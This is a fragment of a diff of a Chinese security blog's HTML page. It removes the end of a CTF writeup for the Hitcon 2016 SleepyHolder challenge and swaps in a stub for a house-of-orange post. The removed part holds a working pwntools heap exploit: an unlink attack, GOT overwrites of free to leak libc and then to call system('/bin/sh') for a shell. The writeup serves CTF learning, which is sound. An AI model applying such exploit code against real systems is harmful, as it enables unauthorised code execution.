class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">heap_ptr = <span class="number">0x6020d0</span> <span class="comment">#堆指针</span></span><br><span class="line"><span class="comment">#准备unlink，在chunk1中伪造chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(heap_ptr - <span class="number">0x18</span>) + p64(heap_ptr - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)<span class="comment">#因为内存复用，这里设置chunk2的prev_size</span></span><br><span class="line">add(<span class="number">1</span>, payload)</span><br><span class="line"><span class="comment">#此时chunk2的inuse位是0，所以触发unlink</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">atoi_off = libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink后 堆指针被修改，向现在指针所指内存写入数据</span></span><br><span class="line"><span class="comment">#将chunk2指针覆盖为atoi_got</span></span><br><span class="line"><span class="comment">#将chunk3指针覆盖为puts_got</span></span><br><span class="line"><span class="comment">#将chunk1指针覆盖为free_got</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(atoi_got)</span><br><span class="line">payload += p64(puts_got) + p64(free_got)</span><br><span class="line">update(<span class="number">1</span>, payload)</span><br><span class="line"><span class="comment">#再次向chunk1写入，相当于向free_got写入</span></span><br><span class="line"><span class="comment">#这里将free_got写为puts</span></span><br><span class="line">update(<span class="number">1</span>, p64(puts))</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)</span></span><br><span class="line"><span class="comment">#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址</span></span><br><span class="line"><span class="comment">#由此可计算出libc_base</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>) - atoi_off<span class="comment">#通过调试发现，这里只能取6个字节</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base : %#x"</span> % libc_base </span><br><span class="line">system = libc_base + system_off</span><br><span class="line"></span><br><span class="line"><span class="comment">#将free的got表写为system</span></span><br><span class="line">update(<span class="number">1</span>, p64(system))</span><br><span class="line"><span class="comment">#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数</span></span><br><span class="line">add(<span class="number">2</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/fastbinAtk/Hitcon2016_SleepyHolder/SleepyHolder" target="_blank" rel="noopener">SleepyHolder</a><br>exp参考：<a href="https://github.com/mehQQ/public_writeup/blob/master/hitcon2016/SleepyHolder/exp.py" target="_blank" rel="noopener">how2heap提供</a></p>
+<h2 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h2><p><em>//TODO</em></p>
 
       
     </div>
@@ -448,15 +472,13 @@
       
         <div class="post-tags">
           
-            <a href="/tags/unlink/" rel="tag"># unlink</a>
-          
-            <a href="/tags/writeup/" rel="tag"># writeup</a>
-          
-            <a href="/tags/how2heap/" rel="tag"># how2heap</a>
-          
             <a href="/tags/堆利用/" rel="tag"># 堆利用</a>
           
-            <a href="/tags/double-free/" rel="tag"># double_free</a>
+            <a href="/tags/house-of-orange/" rel="tag"># house_of_orange</a>
+          
+            <a href="/tags/IO-FILE/" rel="tag"># IO_FILE</a>
+          
+            <a href="/tags/unsortedbin-attack/" rel="tag"># unsortedbin_attack</a>
           
         </div>
       
@@ -469,8 +491,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/post/531412d5.html" rel="next" title="堆利用学习之fastbin attack">
-                <i class="fa fa-chevron-left"></i> 堆利用学习之fastbin attack
+              <a href="/post/1b661c73.html" rel="next" title="hack.lu2014-oreo writeup">
+                <i class="fa fa-chevron-left"></i> hack.lu2014-oreo writeup
               </a>
             
           </div>
@@ -478,10 +500,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/post/1b661c73.html" rel="prev" title="hack.lu2014-oreo writeup">
-                hack.lu2014-oreo writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -634,7 +652,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序概况"><span class="nav-number">2.</span> <span class="nav-text">程序概况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#double-free"><span class="nav-number">3.1.</span> <span class="nav-text">double free</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#修改inuse位"><span class="nav-number">3.1.1.</span> <span class="nav-text">修改inuse位</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-number">3.2.</span> <span class="nav-text">unlink</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我的exp"><span class="nav-number">5.</span> <span class="nav-text">我的exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关链接"><span class="nav-number">6.</span> <span class="nav-text">相关链接</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目描述"><span class="nav-number">2.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#程序分析"><span class="nav-number">3.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露libc基址和堆地址"><span class="nav-number">4.1.</span> <span class="nav-text">泄露libc基址和堆地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">4.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用过程"><span class="nav-number">4.1.2.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsortedbin-attack"><span class="nav-number">4.2.</span> <span class="nav-text">unsortedbin attack</span></a></li></ol></li></ol></div>
             
 
           </div>
